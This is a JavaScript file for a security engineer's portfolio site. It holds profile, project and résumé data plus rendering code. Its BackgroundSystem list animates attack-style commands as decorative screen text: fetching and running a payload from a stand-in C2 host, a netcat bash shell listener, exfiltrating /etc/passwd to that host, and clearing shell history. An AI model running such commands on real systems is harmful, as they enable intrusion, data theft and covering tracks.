const userData = {
    personal: {
        name: "Qays Sarayra",
        title: "Security Engineer",
        logo: "./assets/img/logos/1.png",
        cv: "./CV/Qays.pdf",
        resume: "./CV/Qays.pdf"
    },
    achievements: {
        'Job Achievements': 8,
        'Years of Experience': 3,
        'Happy Clients': 25,
        'Project Completed': 15
    },
    contact: {
        phone: "0792785506",
        email: "info@qayssarayra.com",
        social: [
            {
                name: "GitHub",
                url: "https://github.com/qays3",
                icon: `<path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/>`
            },
            {
                name: "LinkedIn",
                url: "https://www.linkedin.com/in/qays-sarayra/",
                icon: `<path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/>`
            },
            {
                name: "Buy Me Coffee",
                url: "https://buymeacoffee.com/hidden",
                icon: `<path d="M18 8h1a4 4 0 0 1 0 8h-1"/><path d="M2 8h16v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V8z"/><line x1="6" y1="1" x2="6" y2="4"/><line x1="10" y1="1" x2="10" y2="4"/><line x1="14" y1="1" x2="14" y2="4"/>`
            },
            {
                name: "Website",
                url: "https://qayssarayra.com",
                icon: `<circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>`
            }
        ]
    },
    skills: {
        "Security Tools": [
            "Jenkins", "Snyk", "Terraform", "Ghidra", "Wireshark", "Tshark", "Splunk", 
            "Autopsy", "FTK Imager", "Volatility", "Nmap", "Amass", "Metasploit"
        ],
        "Programming Languages": [
            "Python", "Shell Scripting", "PowerShell", "C++", "PHP", "FastAPI", 
            "JavaScript", "GO", "Ruby", "Rust", "MySQL", "PostgreSQL"
        ],
        "Specialties": [
            "Web Application Security", "Full-Stack Development", "API Development", 
            "API Security", "Cloud Security", "Container Security", "CI/CD Pipeline Security", 
            "Vulnerability Management", "Infrastructure as Code (IaC) Security", 
            "Monitoring and Logging", "Malware Analysis"
        ],
        "Platforms": [
            "Linux", "Windows", "Cloud Environments", "Hostinger VPS", "Azure VMs"
        ],
        "DevSecOps Tools": [
            "HashiCorp Vault", "Jenkins", "GitLab CI/CD", "SonarQube", "Trivy", 
            "Anchore", "Snyk", "Aqua Security", "Checkov", "Terraform", "Falco", 
            "Sysdig", "Prisma Cloud", "Grype", "Clair", "Splunk", "Microsoft Sentinel"
        ]
    },
    projects: [
        {
            name: "Perflect",
            description: "A security operations tool designed to simplify and automate server management tasks",
            categories: ["CyberSecurity", "Tools", "DevSecOps"],
            github: "https://github.com/qays3/Perflect",
            live: null
        },
        {
            name: "CAOS",
            description: "A custom operating system focused on cybersecurity tools and defense mechanisms",
            categories: ["CyberSecurity", "Tools"],
            github: null,
            live: "https://www.canva.com/design/DAGQvdcUL-g/KITEDr5X1kWLTRHck2xlxQ/view?utlId=h8fd0ae9662"
        },
        {
            name: "CyberSecurity Services Website",
            description: "A website showcasing and offering cybersecurity services to clients",
            categories: ["CyberSecurity"],
            github: null,
            live: "https://cyberalien.net/"
        },
        {
            name: "CyberSecurity Competition Platform",
            description: "A platform to host and manage cybersecurity competitions and challenges",
            categories: ["CyberSecurity", "Tools"],
            github: null,
            live: "https://ctf.cyberalien.net/"
        },
        {
            name: "CyberSecurity Competition Platform Panel",
            description: "An admin panel to control and monitor cybersecurity competition activities",
            categories: ["CyberSecurity", "Tools"],
            github: null,
            live: "https://adminpanel.cyberalien.net/Admin_login"
        },
        {
            name: "Competition Portfolio",
            description: "A collection or showcase of cybersecurity competitions and related achievements",
            categories: ["CyberSecurity"],
            github: null,
            live: null
        },
        {
            name: "DockerRunKit API",
            description: "An API service to run docker containers on virtual machines programmatically",
            categories: ["Tools", "DevSecOps", "Cloud Engineer"],
            github: "https://github.com/qays3/api-dockerrunkit",
            live: null
        },
        {
            name: "XenoTrojan",
            description: "A trojan malware project used for research or testing security defenses",
            categories: ["CyberSecurity", "Tools"],
            github: "https://github.com/qays3/XenoTrojan/",
            live: null
        },
        {
            name: "VirusGuard",
            description: "A tool or system designed for analyzing and detecting malware threats",
            categories: ["CyberSecurity", "Tools"],
            github: "https://github.com/qays3/VirusGuard",
            live: null
        },
        {
            name: "SiteLaunch-v2",
            description: "A tool to help network administrators deploy and manage websites efficiently",
            categories: ["Tools", "DevSecOps"],
            github: "https://github.com/qays3/SiteLaunch-v2",
            live: null
        },
        {
            name: "OpenVPN Generator",
            description: "A utility to create and configure OpenVPN profiles easily",
            categories: ["CyberSecurity", "Tools", "Cloud Security"],
            github: "https://github.com/qays3/OpenVPN-Generator",
            live: null
        },
        {
            name: "AI-Generated-Exploit",
            description: "An AI-powered tool that generates exploits for vulnerability research",
            categories: ["CyberSecurity", "Tools"],
            github: "https://github.com/qays3/AI-Generated-Exploit",
            live: null
        },
        {
            name: "IOT-IDS",
            description: "An intrusion detection system designed specifically for IoT devices and networks",
            categories: ["CyberSecurity", "Tools", "Cloud Security"],
            github: "https://github.com/qays3/IOT-IDS",
            live: null
        }
    ],
    resume: [
        {
            title: "CompTIA Security+ SY0-701",
            organization: "CompTIA",
            type: "CERTIFICATION",
            date: "2024",
            period: "2024",
            description: "Industry-leading cybersecurity certification covering essential security skills including threat detection, risk management, incident response, and security architecture. Validates hands-on skills in security controls and vulnerability management.",
            details: [
                "Network Security and Infrastructure",
                "Threat Detection and Response",
                "Risk Management and Compliance",
                "Identity and Access Management",
                "Cryptography and PKI"
            ],
            link: "https://www.credly.com/badges/4608c0d7-ac01-4573-85aa-7912bb1ed6df/public_url"
        },
        {
            title: "Google Cybersecurity Professional",
            organization: "Google",
            type: "CERTIFICATION",
            date: "2024",
            period: "2024",
            description: "Comprehensive cybersecurity program covering foundational security concepts, incident response, and hands-on experience with industry tools and techniques.",
            details: [
                "Security Frameworks and Controls",
                "Network Security Monitoring",
                "Incident Detection and Response",
                "Linux and SQL Fundamentals",
                "Python for Cybersecurity"
            ],
            link: "https://www.credly.com/badges/2caf761a-8939-4c6a-971d-a24d45a298d7/public_url"
        },
        {
            title: "Security Engineer / Full Stack Developer",
            organization: "CyberAliens",
            type: "Work EXPERIENCE",
            date: "Nov 2023 – Feb 2025",
            period: "Nov 2023 – Feb 2025",
            description: "Led cybersecurity initiatives and full-stack development projects, focusing on security operations, platform development, and open-source security tools.",
            details: [
                "Leadership: Led CTF competitions, trainer learning paths, security testing, and disaster recovery planning",
                "Platform Development: Built CyberAliens Website for hosting CTFs and delivering cybersecurity services",
                "Innovation: Developed open-source security tools for penetration testing and web security",
                "Security Operations: Designed SecOps frameworks for incident response and API threat mitigation"
            ],
            link: "https://cyberalien.net/"
        },
        {
            title: "Authorized Partner",
            organization: "CompTIA | Jordan and Global",
            type: "Work EXPERIENCE",
            date: "Mar 2024 – Present",
            period: "Mar 2024 – Present",
            description: "Strategic partnerships with leading universities in Jordan to promote CompTIA certifications and cybersecurity education.",
            details: [
                "Partnership with Amman Arab University",
                "Partnership with Jordan University of Science and Technology",
                "Partnership with Applied Science Private University",
                "Partnership with Philadelphia University"
            ],
            link: null
        },
        {
            title: "Bachelor's Degree in Cyber Security",
            organization: "Amman Arab University",
            type: "EDUCATION",
            date: "Oct 2021 – Jun 2025",
            period: "Oct 2021 – Jun 2025",
            description: "Comprehensive cybersecurity education covering theoretical foundations and practical applications in information security, network security, and digital forensics.",
            details: [
                "Information Security Fundamentals",
                "Network Security and Architecture",
                "Digital Forensics and Incident Response",
                "Ethical Hacking and Penetration Testing",
                "Cybersecurity Law and Ethics"
            ],
            link: null
        },
        {
            title: "Certificate of Appreciation - 2nd Place",
            organization: "Amman Arab University (CyberTalents)",
            type: "Activities",
            date: "2024",
            period: "2024",
            description: "Achieved second place in cybersecurity competition demonstrating advanced skills in various security domains.",
            details: [
                "Competitive Cybersecurity Challenge",
                "Multi-domain Security Skills Assessment",
                "Recognition for Excellence in Cybersecurity"
            ],
            link: null
        },
        {
            title: "Aliens-CTFv1 Qualification Event",
            organization: "CyberAliens",
            type: "Activities",
            date: "2024",
            period: "2024",
            description: "Coordinated and managed the qualification round of Aliens Capture The Flag cybersecurity competition.",
            details: [
                "Event Planning and Coordination",
                "Technical Infrastructure Setup",
                "Challenge Development and Testing",
                "Participant Support and Management"
            ],
            link: "https://ctf.cyberalien.net/events/ACTFv1-qualification"
        },
        {
            title: "Aliens-CTFv1 Finals Event",
            organization: "CyberAliens",
            type: "Activities",
            date: "2024",
            period: "2024",
            description: "Managed the final round of Aliens Capture The Flag cybersecurity competition.",
            details: [
                "Finals Event Coordination",
                "Advanced Challenge Management",
                "Live Event Technical Support",
                "Winner Selection and Awards"
            ],
            link: "https://ctf.cyberalien.net/events/ACTFv1-Finals"
        },
        {
            title: "AAU-CTFv1 Event",
            organization: "Amman Arab University",
            type: "Activities",
            date: "2023",
            period: "2023",
            description: "Organized and managed the first iteration of Amman Arab University Capture The Flag competition.",
            details: [
                "University-level CTF Organization",
                "Student Team Coordination",
                "Educational Challenge Development",
                "Academic Partnership Management"
            ],
            link: null
        },
        {
            title: "AAU-CTFv2 Event",
            organization: "Amman Arab University",
            type: "Activities",
            date: "2024",
            period: "2024",
            description: "Organized and managed the second iteration of Amman Arab University Capture The Flag competition.",
            details: [
                "University-level CTF Organization",
                "Student Team Coordination",
                "Educational Challenge Development",
                "Academic Partnership Management"
            ],
            link: "https://ctf.cyberalien.net/events/AAUCTFv2"
        },
        {
            title: "AAU-CTFv3 Event",
            organization: "Amman Arab University",
            type: "Activities",
            date: "2025",
            period: "2025",
            description: "Organized and managed the third iteration of Amman Arab University Capture The Flag competition.",
            details: [
                "University-level CTF Organization",
                "Student Team Coordination",
                "Educational Challenge Development",
                "Academic Partnership Management"
            ],
            link: null
        },
        {
            title: "CTF System Administrator LesCTF",
            organization: "LesCTF",
            type: "Activities",
            date: "2024",
            period: "2024",
            description: "System administrator for LesCTF hybrid cybersecurity competition.",
            details: [
                "System Administration and Setup",
                "Hybrid Event Technical Management",
                "Infrastructure Monitoring",
                "Technical Support Coordination"
            ],
            link: null
        },
        {
            title: "TUX-CTFv2 Event",
            organization: "TUX Community",
            type: "Activities",
            date: "2024",
            period: "2024",
            description: "System administrator and coordinator for TUX Capture The Flag competition second edition.",
            details: [
                "System Administration and Setup",
                "Technical Infrastructure Management",
                "Community Event Coordination",
                "Linux-focused Challenge Development"
            ],
            link: "https://ctf.cyberalien.net/events/TUXCTFv2"
        },
        {
            title: "ICPC Achievement Certificate",
            organization: "International Collegiate Programming Contest",
            type: "Activities",
            date: "2022",
            period: "2022",
            description: "Participated and achieved recognition in the prestigious International Collegiate Programming Contest.",
            details: [
                "Competitive Programming Competition",
                "Algorithm and Problem-Solving Skills",
                "Team Collaboration and Time Management"
            ],
            link: null
        },
        {
            title: "NCSC Advance Training Certificate",
            organization: "National Cyber Security Center",
            type: "Activities",
            date: "2023",
            period: "2023",
            description: "Completed advanced cybersecurity training program focusing on national-level security operations and strategies.",
            details: [
                "Advanced Cyber Threat Analysis",
                "National Security Framework Understanding",
                "Advanced Incident Response Techniques"
            ],
            link: null
        },
        {
            title: "NASA Space Apps Challenge",
            organization: "NASA",
            type: "Activities",
            date: "2024",
            period: "2024",
            description: "Participated in NASA's international hackathon focusing on space exploration and Earth observation challenges.",
            details: [
                "Space Technology Innovation",
                "Earth Observation and Analysis",
                "Cross-disciplinary Problem Solving",
                "International Collaboration"
            ],
            link: "https://qayssarayra.com/content/certification/Nasa.pdf"
        },
        {
            title: "Queen Rania Entrepreneurship Competition",
            organization: "Business Park ZINC",
            type: "Activities",
            date: "2023",
            period: "2023",
            description: "Participated in prestigious entrepreneurship competition focusing on innovative business solutions and startup development.",
            details: [
                "Business Model Development",
                "Innovation and Entrepreneurship",
                "Pitch Presentation Skills",
                "Market Analysis and Strategy"
            ],
            link: null
        }
    ],
    about: "I'm a <strong>security engineer</strong> with expertise in <strong>security operations</strong>, <strong>threat detection</strong>, <strong>vulnerability management</strong>, and <strong>incident response</strong> across <strong>cloud environments</strong>. Skilled in developing and implementing robust <strong>cybersecurity solutions</strong> to protect organizational assets. Currently expanding my knowledge in <strong>DevSecOps</strong> to integrate security practices into development and operations workflows. Passionate about strengthening security posture through <strong>innovative and effective technology strategies</strong>."
};

const state = {
    currentFilter: 'All',
    currentResumeFilter: 'Work EXPERIENCE',
    currentSkillsFilter: 'Security Tools',
    backgroundElements: [],
    currentSlot: 0,
    sidebarState: window.innerWidth > 768,
    isSmallScreen: window.innerWidth <= 768
};

const getElement = (id) => document.getElementById(id);

class DataLoader {
    static init() {
        this.loadBasicData();
        this.loadAchievements();
        this.loadAbout();
        this.loadWorks();
        this.loadResume();
        this.loadSkills();
        this.loadContact();
        this.initializeEventListeners();
    }

    static loadBasicData() {
        const profileLogo = getElement('profileLogo');
        const profileName = getElement('profileName');
        const profileTitle = getElement('profileTitle');
        const aboutImage = getElement('aboutImage');
        
        if (profileLogo) {
            profileLogo.src = userData.personal.logo;
            profileLogo.alt = userData.personal.name;
        }
        
        if (profileName) profileName.textContent = userData.personal.name;
        if (profileTitle) profileTitle.textContent = userData.personal.title;
        if (aboutImage) aboutImage.alt = userData.personal.name;
        
        document.title = `${userData.personal.name} - Portfolio`;
    }

    static loadAchievements() {
        const achievementsGrid = getElement('achievementsGrid');
        if (!achievementsGrid) return;
        
        Object.entries(userData.achievements).forEach(([label, value]) => {
            const achievementBox = document.createElement('div');
            achievementBox.className = 'achievement-box';
            
            const numberEl = document.createElement('div');
            numberEl.className = 'achievement-number';
            numberEl.setAttribute('data-target', value);
            numberEl.textContent = '0+';
            
            const labelEl = document.createElement('div');
            labelEl.className = 'achievement-label';
            labelEl.textContent = label;
            
            achievementBox.appendChild(numberEl);
            achievementBox.appendChild(labelEl);
            achievementsGrid.appendChild(achievementBox);
        });
        
        this.observeAchievements();
    }

    static observeAchievements() {
        const section = document.querySelector('.achievements-section');
        if (!section) return;
        
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    setTimeout(() => this.animateNumbers(), 300);
                    observer.unobserve(entry.target);
                }
            });
        }, { threshold: 0.5 });
        
        observer.observe(section);
    }

    static animateNumbers() {
        const numbers = document.querySelectorAll('.achievement-number');
        numbers.forEach((el, index) => {
            const target = parseInt(el.dataset.target);
            const duration = 2000;
            const increment = Math.max(duration / target, 50);
            let current = 0;
            
            setTimeout(() => {
                const timer = setInterval(() => {
                    current++;
                    el.textContent = current + '+';
                    if (current >= target) {
                        clearInterval(timer);
                        el.textContent = target + '+';
                    }
                }, increment);
            }, index * 200);
        });
    }

    static loadAbout() {
        const aboutContent = getElement('aboutContent');
        if (aboutContent) {
            aboutContent.innerHTML = userData.about;
        }
    }

    static loadWorks() {
        this.renderProjects();
        this.initializeWorksFilters();
    }

    static renderProjects() {
        const grid = getElement('worksGrid');
        if (!grid) return;
        
        const filtered = state.currentFilter === 'All' 
            ? userData.projects 
            : userData.projects.filter(p => p.categories.includes(state.currentFilter));
        
        grid.innerHTML = '';
        
        filtered.forEach((project, index) => {
            const card = this.createProjectCard(project, index);
            grid.appendChild(card);
        });
        
        this.initializeProjectButtons();
    }

    static createProjectCard(project, index) {
        const card = document.createElement('div');
        card.className = 'project-card';
        card.style.animationDelay = `${index * 0.1}s`;
        
        const header = document.createElement('div');
        header.className = 'project-header';
        
        const nameEl = document.createElement('h3');
        nameEl.className = 'project-name';
        nameEl.textContent = project.name;
        
        const categoriesContainer = document.createElement('div');
        categoriesContainer.className = 'project-categories';
        
        project.categories.forEach(cat => {
            const span = document.createElement('span');
            span.className = 'project-category';
            span.textContent = cat;
            categoriesContainer.appendChild(span);
        });
        
        const description = document.createElement('p');
        description.className = 'project-description';
        description.textContent = project.description;
        
        header.appendChild(nameEl);
        header.appendChild(categoriesContainer);
        card.appendChild(header);
        card.appendChild(description);
        
        if (project.github || project.live) {
            const buttonsContainer = document.createElement('div');
            buttonsContainer.className = 'project-buttons';
            
            if (project.github) {
                const githubBtn = document.createElement('button');
                githubBtn.className = 'project-btn github-btn';
                githubBtn.setAttribute('data-url', project.github);
                githubBtn.innerHTML = `
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
                        <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/>
                    </svg>
                    GitHub
                `;
                buttonsContainer.appendChild(githubBtn);
            }
            
            if (project.live) {
                const liveBtn = document.createElement('button');
                liveBtn.className = 'project-btn live-btn';
                liveBtn.setAttribute('data-url', project.live);
                liveBtn.innerHTML = `
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
                        <path d="M7 17l9.2-9.2M17 17V7H7"/>
                    </svg>
                    Live Demo
                `;
                buttonsContainer.appendChild(liveBtn);
            }
            
            card.appendChild(buttonsContainer);
        }
        
        return card;
    }

    static initializeWorksFilters() {
        const buttons = document.querySelectorAll('.filter-btn');
        buttons.forEach(btn => {
            btn.addEventListener('click', () => {
                buttons.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                state.currentFilter = btn.dataset.filter;
                this.renderProjects();
            });
        });
    }

    static initializeProjectButtons() {
        const buttons = document.querySelectorAll('.project-btn');
        buttons.forEach(btn => {
            btn.addEventListener('click', () => {
                const url = btn.dataset.url;
                if (url) window.open(url, '_blank');
            });
        });
    }

    static loadResume() {
        this.renderResumeItems();
        this.initializeResumeFilters();
    }

    static renderResumeItems() {
        const timeline = getElement('resumeTimeline');
        if (!timeline) return;
        
        const filtered = userData.resume.filter(item => item.type === state.currentResumeFilter);
        const sorted = filtered.sort((a, b) => {
            const dateA = new Date(a.date.split(' ').pop());
            const dateB = new Date(b.date.split(' ').pop());
            return dateB - dateA;
        });
        
        timeline.innerHTML = '';
        
        sorted.forEach((item, index) => {
            const resumeItem = this.createResumeItem(item, index);
            timeline.appendChild(resumeItem);
        });
        
        this.initializeResumeInteractions();
    }

    static createResumeItem(item, index) {
        const resumeItem = document.createElement('div');
        resumeItem.className = 'resume-item';
        resumeItem.style.animationDelay = `${index * 0.1}s`;
        
        const content = document.createElement('div');
        content.className = 'resume-content';
        content.setAttribute('data-expandable', 'true');
        
        const header = document.createElement('div');
        header.className = 'resume-header';
        
        const headerLeft = document.createElement('div');
        headerLeft.className = 'resume-header-left';
        
        const typeEl = document.createElement('div');
        typeEl.className = `resume-type ${item.type.toLowerCase().replace(/\s+/g, '-')}`;
        typeEl.textContent = item.type;
        headerLeft.appendChild(typeEl);
        
        if (item.link) {
            const linkBtn = document.createElement('button');
            linkBtn.className = 'resume-link-btn';
            linkBtn.setAttribute('data-url', item.link);
            linkBtn.textContent = 'Open';
            headerLeft.appendChild(linkBtn);
        }
        
        const dateEl = document.createElement('div');
        dateEl.className = 'resume-date';
        dateEl.textContent = item.period;
        
        const titleEl = document.createElement('h3');
        titleEl.className = 'resume-title';
        titleEl.textContent = item.title;
        
        const orgEl = document.createElement('p');
        orgEl.className = 'resume-organization';
        orgEl.textContent = item.organization;
        
        const descEl = document.createElement('div');
        descEl.className = 'resume-description';
        descEl.style.display = 'none';
        const descP = document.createElement('p');
        descP.textContent = item.description;
        descEl.appendChild(descP);
        
        const detailsEl = document.createElement('div');
        detailsEl.className = 'resume-details';
        detailsEl.style.display = 'none';
        const detailsList = document.createElement('ul');
        item.details.forEach(detail => {
            const li = document.createElement('li');
            li.textContent = detail;
            detailsList.appendChild(li);
        });
        detailsEl.appendChild(detailsList);
        
        const marker = document.createElement('div');
        marker.className = 'resume-marker';
        
        header.appendChild(headerLeft);
        header.appendChild(dateEl);
        content.appendChild(header);
        content.appendChild(titleEl);
        content.appendChild(orgEl);
        content.appendChild(descEl);
        content.appendChild(detailsEl);
        resumeItem.appendChild(content);
        resumeItem.appendChild(marker);
        
        return resumeItem;
    }

    static initializeResumeFilters() {
        const buttons = document.querySelectorAll('.resume-filter-btn');
        buttons.forEach(btn => {
            btn.addEventListener('click', () => {
                buttons.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                state.currentResumeFilter = btn.dataset.filter;
                this.renderResumeItems();
            });
        });
    }

    static initializeResumeInteractions() {
        const linkBtns = document.querySelectorAll('.resume-link-btn');
        linkBtns.forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.stopPropagation();
                const url = btn.dataset.url;
                if (url) window.open(url, '_blank');
            });
        });

        const contents = document.querySelectorAll('.resume-content[data-expandable="true"]');
        contents.forEach(content => {
            content.addEventListener('click', (e) => {
                if (e.target.closest('.resume-link-btn')) return;
                
                const item = content.closest('.resume-item');
                const description = content.querySelector('.resume-description');
                const details = content.querySelector('.resume-details');
                const isExpanded = item.classList.contains('expanded');
                
                if (isExpanded) {
                    description.style.display = 'none';
                    details.style.display = 'none';
                    item.classList.remove('expanded');
                } else {
                    description.style.display = 'block';
                    details.style.display = 'block';
                    item.classList.add('expanded');
                }
            });
            
            content.style.cursor = 'pointer';
        });
    }

    static loadSkills() {
        this.renderSkills();
        this.initializeSkillsFilters();
    }

    static renderSkills() {
        const grid = getElement('skillsGrid');
        if (!grid) return;
        
        const skills = userData.skills[state.currentSkillsFilter] || [];
        
        grid.innerHTML = '';
        const container = document.createElement('div');
        container.className = 'skills-category-grid single-category';
        
        skills.forEach((skill, index) => {
            const card = document.createElement('div');
            card.className = 'skill-card';
            card.style.animationDelay = `${index * 0.05}s`;
            card.textContent = skill;
            container.appendChild(card);
        });
        
        grid.appendChild(container);
    }

    static initializeSkillsFilters() {
        const buttons = document.querySelectorAll('.skills-filter-btn');
        buttons.forEach(btn => {
            btn.addEventListener('click', () => {
                buttons.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                state.currentSkillsFilter = btn.dataset.filter;
                this.renderSkills();
            });
        });
    }

    static loadContact() {
        const phoneValue = getElement('phoneValue');
        const emailValue = getElement('emailValue');
        const phoneContact = getElement('phoneContact');
        const emailContact = getElement('emailContact');
        const callBtn = getElement('callBtn');
        const emailBtn = getElement('emailBtn');
        const contactSocialLinks = getElement('contactSocialLinks');
        
        if (phoneValue) phoneValue.textContent = userData.contact.phone;
        if (emailValue) emailValue.textContent = userData.contact.email;
        
        if (callBtn) callBtn.href = `tel:${userData.contact.phone}`;
        if (emailBtn) emailBtn.href = `mailto:${userData.contact.email}`;
        
        if (phoneContact) {
            phoneContact.addEventListener('click', () => {
                window.open(`tel:${userData.contact.phone}`, '_self');
            });
        }
        
        if (emailContact) {
            emailContact.addEventListener('click', () => {
                window.open(`mailto:${userData.contact.email}`, '_self');
            });
        }
        
        if (contactSocialLinks) {
            userData.contact.social.forEach((social, index) => {
                const link = document.createElement('a');
                link.href = social.url;
                link.target = '_blank';
                link.className = 'contact-social-link';
                link.style.animationDelay = `${index * 0.1}s`;
                
                const iconDiv = document.createElement('div');
                iconDiv.className = 'contact-social-icon';
                iconDiv.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor">${social.icon}</svg>`;
                
                const nameDiv = document.createElement('div');
                nameDiv.className = 'contact-social-name';
                nameDiv.textContent = social.name;
                
                link.appendChild(iconDiv);
                link.appendChild(nameDiv);
                contactSocialLinks.appendChild(link);
            });
        }
    }

    static initializeEventListeners() {
        const cvBtn = getElement('cvBtn');
        const resumeBtn = getElement('resumeBtn');
        const likeBtn = getElement('likeBtn');
        
        if (cvBtn) {
            cvBtn.addEventListener('click', () => {
                window.open(userData.personal.cv, '_blank');
            });
        }

        if (resumeBtn) {
            resumeBtn.addEventListener('click', () => {
                window.open(userData.personal.resume, '_blank');
            });
        }

        if (likeBtn) {
            likeBtn.addEventListener('click', () => {
                this.createCyberHeart();
                likeBtn.style.transform = 'scale(0.95)';
                setTimeout(() => likeBtn.style.transform = 'scale(1)', 150);
            });
        }

        window.addEventListener('resize', () => {
            const wasSmallScreen = state.isSmallScreen;
            state.isSmallScreen = window.innerWidth <= 768;
            state.sidebarState = window.innerWidth > 768;
            
            if (wasSmallScreen && !state.isSmallScreen) {
                BackgroundSystem.init();
            } else if (!wasSmallScreen && state.isSmallScreen) {
                BackgroundSystem.cleanup();
            }
        });
    }

    static createCyberHeart() {
        const heart = document.createElement('div');
        heart.innerHTML = '♥';
        heart.className = 'cyber-heart';
        document.body.appendChild(heart);
        setTimeout(() => heart.remove(), 2000);
    }
}

class BackgroundSystem {
    static content = [
        'wget http://c2.q9.sh/download',
        'chmod +x ./q9.sh && ./q9.sh',
        './q9.sh --silent --background',
        'nc -lvp 4444 -e /bin/bash',
        'curl -O http://c2.q9/payload.bin',
        './payload.bin --run &',
        'hydra -l admin -P pass.txt ssh://51.140.12.8',
        'ssh admin@51.140.12.8 -p 22',
        'scp loot.zip admin@c2.q9:/loot',
        'az login --service-principal',
        'az keyvault list --resource-g',
        'az keyvault secret list --vault',
        'az keyvault secret show --vault',
        'DETECTED: vault unauthorized',
        'ftp 94.23.45.67',
        'quote USER anonymous',
        'quote PASS pass123',
        'mget * --verbose',
        'put backdoor.php',
        'DETECTED: FTP brute force',
        'telnet mail.q9 110',
        'USER admin@mail.q9',
        'PASS hunter2pass',
        'LIST',
        'RETR 1',
        'DETECTED: POP3 enum detected',
        'git clone https://repo.q9/ci',
        'npm install malicious-payload',
        'docker build -t backdoor-image',
        'kubectl exec pod/exploit-pod',
        'helm upgrade --install evil',
        'DETECTED: pipeline exec',
        'az ad user list --filter "user"',
        'az ad group member list --grp',
        'az ad app list --all',
        'az ad app credential reset --id',
        'Invoke-WebRequest -Uri https://graph.microsoft.com/v1.0/users',
        'POST https://graph.microsoft.com/v1.0/me/sendMail',
        'DETECTED: abnormal Graph API',
        'nmap -sS -T4 185.199.108.153',
        'sqlmap -u http://target.q9 --batch',
        'DETECTED: SQL injection',
        'tar czf /tmp/loot.tar.gz /etc/passwd',
        'scp /tmp/loot.tar.gz c2.q9:/exfil',
        'curl -F "file=@/tmp/loot.tar.gz" http://c2.q9/upload',
        'rm -rf /tmp/loot.tar.gz',
        'clear && history -c',
        'grep "Failed password" /var/log/auth.log',
        'journalctl -u vault --since "1h"',
        'az network watcher show-topology',
        'az net watcher pkt-capture create',
        'az net watcher flow-log configure',
        'az network nsg rule create --nsg core-nsg --name blockQ9 --priority 100 --access Deny --src 51.140.12.8',
        'az role assignment delete --assignee q9',
        'kubectl delete pod exploit-pod',
        'kubectl auth can-i list secrets --as attacker',
        'az ad group delete --group Admins',
        'az ad user revoke-signin-sessions --id compromised@corp.com',
        'snort -T -c /etc/snort/snort.conf',
        'suricata-update && systemctl restart suricata',
        'whois 51.140.12.8',
        'netstat -antp | grep ESTABLISHED'
    ];

    static animationInterval = null;

    static init() {
        if (state.isSmallScreen) return;
        this.startAnimation();
    }

    static cleanup() {
        if (this.animationInterval) {
            clearInterval(this.animationInterval);
            this.animationInterval = null;
        }
        
        state.backgroundElements.forEach(element => {
            if (element.parentNode) {
                element.remove();
            }
        });
        state.backgroundElements = [];
    }

    static getSlots() {
        if (state.isSmallScreen) return [];
        
        const baseOffset = state.sidebarState && window.innerWidth > 768 ? '18%' : '5%';
        const rightOffset = state.sidebarState && window.innerWidth > 768 ? '84%' : '82%';
        const centerLeft = state.sidebarState && window.innerWidth > 768 ? '48%' : '40%';
        const centerMiddle = state.sidebarState && window.innerWidth > 768 ? '53%' : '45%';
        const centerRight = state.sidebarState && window.innerWidth > 768 ? '58%' : '50%';

        return [
            { left: baseOffset, top: '15%', side: 'attacker' },
            { left: baseOffset, top: '40%', side: 'attacker' },
            { left: baseOffset, top: '65%', side: 'attacker' },
            { left: rightOffset, top: '20%', side: 'defense' },
            { left: rightOffset, top: '45%', side: 'defense' },
            { left: rightOffset, top: '70%', side: 'defense' },
            { left: centerLeft, top: '8%', side: 'attacker' },
            { left: centerMiddle, top: '92%', side: 'defense' },
            { left: centerRight, top: '8%', side: 'attacker' }
        ];
    }

    static createElement() {
        if (state.isSmallScreen) return;
        
        if (state.backgroundElements.length >= 9) {
            const old = state.backgroundElements.shift();
            if (old?.parentNode) {
                old.style.animation = 'cleanDisappear 0.8s ease-out forwards';
                setTimeout(() => old.remove(), 800);
            }
        }

        const content = this.content[Math.floor(Math.random() * this.content.length)];
        const slots = this.getSlots();
        if (slots.length === 0) return;
        
        const slot = slots[state.currentSlot];
        state.currentSlot = (state.currentSlot + 1) % slots.length;

        const element = document.createElement('div');
        element.textContent = content;
        element.className = `clean-background-element ${slot.side}`;
        element.style.top = slot.top;
        element.style.left = slot.left;
        element.style.animation = 'cleanAppear 1s ease-out forwards';

        document.body.appendChild(element);
        state.backgroundElements.push(element);
    }

    static startAnimation() {
        if (state.isSmallScreen) return;
        
        for (let i = 0; i < 3; i++) {
            setTimeout(() => this.createElement(), i * 1000);
        }
        
        this.animationInterval = setInterval(() => this.createElement(), 4000);
    }
}

